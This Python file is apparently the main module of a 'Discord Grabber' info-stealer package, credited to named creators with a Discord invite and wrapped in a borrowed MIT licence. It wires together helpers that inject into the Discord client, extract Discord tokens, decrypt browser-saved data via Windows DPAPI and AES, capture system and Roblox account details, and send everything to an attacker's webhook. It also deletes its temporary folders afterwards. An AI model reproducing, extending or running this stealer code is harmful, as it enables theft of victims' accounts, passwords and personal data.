#Copyright (c) 2012-2024 Scott Chacon and others

#Permission is hereby granted, free of charge, to any person obtaining
#a copy of this software and associated documentation files (the
#"Software"), to deal in the Software without restriction, including
#without limitation the rights to use, copy, modify, merge, publish,
#distribute, sublicense, and/or sell copies of the Software, and to
#permit persons to whom the Software is furnished to do so, subject to
#the following conditions:
#
#The above copyright notice and this permission notice shall be
#included in all copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
#EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
#MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
#NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
#LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
#OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
#WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

'''
An import for an Easy Discord Grabber Webhook 

\n\ndiscord : https://discord.gg/tRgE7eFTkt
\ncreator : yashing2 and VMS_SHOP and phantoms_._

\n\n____________________________________________________
\n            The import StealerDiscord need import :
\n____________________________________________________
\n
import pycryptodome
import requests
import vpo
import pillow
import base64
import datetime
import json
import psutil
import re
import shutil
import sqlite3
import pywin32
\n____________________________________________________
\n____________________________________________________
\n
\n----------------------------------------------------
\n____________________________________________________
\n                   LICENCE : 
\n____________________________________________________
\n
\nCopyright (c) 2012-2024 Scott Chacon and others
\nPermission is hereby granted, free of charge, to any person obtaining
\na copy of this software and associated documentation files (the
\n"Software"), to deal in the Software without restriction, including
\nwithout limitation the rights to use, copy, modify, merge, publish,
\ndistribute, sublicense, and/or sell copies of the Software, and to
\npermit persons to whom the Software is furnished to do so, subject to
\nthe following conditions:
\n#
\nThe above copyright notice and this permission notice shall be
\nincluded in all copies or substantial portions of the Software.
\n#
\nTHE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
\nLIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
\nOF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
\nWITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
\n
\n____________________________________________________
\n____________________________________________________
'''
import requests
import vpo
import os, json, base64, shutil, sqlite3
import os.path
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime
import subprocess
import psutil
import re
import random
from discord import Embed, SyncWebhook
import json
from .discord_injection import use_discord_injection
from .exctract_pc_info import get_info
from .extract_browser import extract_data_browser
from .extract_token import extract
from .token_info import token_info
from .roblox_info import robloxinfo

temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
user = os.path.expanduser("~")
appdata = os.getenv('LOCALAPPDATA')

def init_var(path_zip = "\\AppData\\Local\\Temp\\Info"):
    try:           
        shutil.rmtree(user+f"{path_zip}.zip")
        shutil.rmtree(user+path_zip)
    except:
        try:
            path1 = user+ "{path_zip}.zip"
            path2 = user+ path_zip
            os.system(f'rmdir /s /q {path1}')
            os.system(f'rmdir /s /q {path2}')
        except:
            pass
        
    try: os.mkdir(temp_path) 
    except: pass

def at_final(path_zip = "\\AppData\\Local\\Temp\\Info"):
    try:
        try:
            shutil.rmtree(user+ path_zip + ".zip")
            shutil.rmtree(user+path_zip)
            shutil.rmtree(user+path_zip)
        except:
            pass
    except:
        try:
            path1 = user+ path_zip + ".zip"
            path2 = user+ path_zip
            os.system(f'rmdir /s /q {path1}')
            os.system(f'rmdir /s /q {path2}')
        except:
            pass
        
def discord_injection(webhook: str):
    try:
        use_discord_injection(webhook)
    except:
        pass
    
def extract_info(webhook: str):
    try:
        get_info(webhook)
    except:
        pass

def extract_browser(webhook: str, path = "\\AppData\\Local\\Temp\\Info"):
    try:
        extract_data_browser(webhook, path=path)
    except:
        pass

def discord_info(webhook: str):
    try:
        token = extract(webhook)
        for token in token:
            token_info(token, webhook)
    except:
        pass
    
def get_roblox_info(webhook: str, path = "\\AppData\\Local\\Temp\\Info"):
    try:
        robloxinfo(webhook, path)
    except:
        pass